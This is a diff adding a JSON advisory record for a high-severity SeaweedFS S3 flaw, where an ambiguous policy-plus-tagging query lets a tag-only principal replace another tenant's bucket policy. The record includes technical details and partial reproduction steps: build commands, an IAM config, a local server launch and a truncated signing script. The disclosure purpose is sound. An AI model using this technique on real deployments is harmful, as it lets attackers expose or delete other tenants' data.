@@ -1,0 +1,47 @@
+{
+  "id": "GHSA-mgv5-vf6w-3h85",
+  "aliases": [],
+  "title": "Ambiguous S3 subresource query lets a bucket tagger replace the bucket policy",
+  "summary": "# Ambiguous S3 subresource query lets a bucket tagger replace the bucket policy\n\n## Summary\n\nSeaweedFS routes an S3 `PUT` containing both `policy` and `tagging` subresources to the bucket-policy handler, while its IAM action resolver authorizes the same request only as `s3:PutBucketTagging`. A low-privilege principal delegated tag management on another tenant's bucket can therefore install an arbitrary bucket policy. The reproduced policy exposed a previously private victim object to an anonymous request.\n\n## Impact and affected scope\n\n- **Type:** Broken access control\n- **Affected component:** SigV4-authenticated SeaweedFS S3 gateway bucket subresource handling\n- **Preconditions:** A valid S3 identity with `s3:PutBucketTagging` on the victim bucket but no bucket-policy permission\n- **Verified revision:** `8dcdb70594ae9e9c2ac07aa6d497f38d8c580448` on 27 August 2026\n- **Affected release range:** `<= 4.44`, as entered by the maintainer; patched version not yet specified\n\nThe demonstrated policy granted anonymous read, write, and delete actions to the victim bucket's objects. The report does not claim impact outside the affected bucket authorization boundary.\n\n## Technical details\n\nGorilla routing selects the bucket-policy handler because the `policy` route is registered first and still matches when extra query keys are present. The independently ordered action resolver checks `tagging` first, so IAM authorizes only `s3:PutBucketTagging`. The selected policy handler then persists the supplied policy without a second policy-management check.\n\nRelevant code:\n\n- `weed/s3api/s3api_server.go:899` - registers the bucket subresource routes.\n- `weed/s3api/s3_action_resolver.go:148,196` - resolves the ambiguous request as tag management.\n- `weed/s3api/s3_iam_middleware.go:304` and `weed/s3api/auth_credentials.go:2659` - authorize the resolved action.\n- `weed/s3api/s3api_bucket_policy_handlers.go:73,239` - stores and applies the policy body.\n\n## Reproduction\n\nRun this only on an authorized disposable host with Go 1.26 and Python 3. Build the verified revision:\n\n```sh\ngit clone https://github.com/seaweedfs/seaweedfs.git\ncd seaweedfs\ngit checkout 8dcdb70594ae9e9c2ac07aa6d497f38d8c580448\ngo build -trimpath -o weed-poc ./weed\nmkdir -p poc-data poc-tmp\n```\n\nSave this as `s3-poc.json`:\n\n```json\n{\n  \"identities\": [\n    {\n      \"name\": \"victim-admin\",\n      \"credentials\": [\n        {\"accessKey\": \"victim-admin\", \"secretKey\": \"victim-secret\"}\n      ],\n      \"actions\": [\"Admin\"]\n    },\n    {\n      \"name\": \"tagger\",\n      \"credentials\": [\n        {\"accessKey\": \"tagger\", \"secretKey\": \"tagger-secret\"}\n      ],\n      \"policyNames\": [\"VictimTagOnly\"]\n    }\n  ],\n  \"policies\": [\n    {\n      \"name\": \"VictimTagOnly\",\n      \"content\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Action\\\":[\\\"s3:PutBucketTagging\\\"],\\\"Resource\\\":[\\\"arn:aws:s3:::victim-bucket\\\"]}]}\"\n    }\n  ]\n}\n```\n\nStart the real mini deployment:\n\n```sh\nTMPDIR=\"$PWD/poc-tmp\" WEED_TELEMETRY=false ./weed-poc mini \\\n  -dir=\"$PWD/poc-data\" \\\n  -ip=127.0.0.1 -ip.bind=127.0.0.1 \\\n  -master.port=19333 -volume.port=19340 -filer.port=18888 \\\n  -s3.port=18333 -s3.port.iceberg=0 -s3.port.lance=0 \\\n  -s3.config=\"$PWD/s3-poc.json\" -metricsPort=19326 \\\n  -webdav=false -admin.ui=false -master.telemetry=false \\\n  -master.volumeSizeLimitMB=64 -volume.preStopSeconds=0 \\\n  >seaweedfs-poc.log 2>&1 &\n```\n\nSave this as `verify_policy_query.py`:\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport datetime\nimport hashlib\nimport hmac\nimport http.client\nimport json\nimport sys\nimport time\nimport urllib.parse\n\nHOST = \"127.0.0.1\"\nPORT = 18333\nREGION = \"us-east-1\"\nSERVICE = \"s3\"\n\n\ndef _sign(key: bytes, message: str) -> bytes:\n    return hmac.new(key, message.encode(), hashlib.sha256).digest()\n\n\ndef request(method: str, path: str, query: list[tuple[str, str]] | None = None,\n            body: bytes = b\"\", access: str | None = None,\n            secret: str | None = None) -> tupl...",
+  "published_at": "2026-11-09T19:44:48.000Z",
+  "modified_at": "2026-11-09T19:44:48.000Z",
+  "severity": {
+    "level": "high",
+    "score": 8.7,
+    "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "4.44"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-mgv5-vf6w-3h85",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-mgv5-vf6w-3h85",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-mgv5-vf6w-3h85",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:85bcc2b13f178c9a90ea36ee873fad9529e819b984ab894a3a6e7664ca717841",
+  "note": null
+}
